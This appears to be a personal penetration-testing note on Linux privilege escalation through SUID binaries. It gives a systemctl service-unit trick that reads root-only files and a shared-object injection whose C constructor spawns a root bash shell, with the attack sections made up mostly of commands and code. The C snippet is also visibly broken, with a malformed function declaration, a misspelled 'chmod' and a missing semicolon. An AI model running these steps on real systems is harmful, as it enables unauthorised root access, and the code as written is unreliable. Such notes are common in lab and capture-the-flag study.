-- -
Abuse software that is vulnerable to being hijacked to run a shell command or file read or something it shouldn't because it has its SUID bit set and runs as root always. 
### General workflow
#### Enum
![[SUIDs#^ed7f08]]
#### Find Exploits
Go to [GTFOBins](https://gtfobins.github.io/#+suid) and search the output of above command. 

### Things I've Exploited
#### systemctl
#sytemctlexploit It is a file read exploit, so you won't get a shell, but you can read any file root can. 
```bash
TF=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
cat /tmp/output # outputs the file you wanted to read
```
### Shared Object Injection

^2ec112

#SOInjection 
#### Enum
![[SUIDs#^8b428f]]
#### Exploit
```bash
# So this will be an example, the specifics in your situation will depend on the situation you are in. 

# in this example, it was looking for the file:
# /home/user/.config/libcalc.so
# .config nor libcalc.so exist at those locations, so we will make the directory and create some C code that will hijack execution when suid-so picks it up
cd /home/user
mkdir .config
cd .config
vim libcalc.c
```
**libcalc.c**
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject {
	system("cp /bin/bash /tmp/bash && shmod +x /tmp/bash && /tmp/bash -p")
}
```
#### Compile and exploit
```bash
# Compile to the expected location with the expected file
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c

# run original suid program
/usr/local/bin/suid-so
```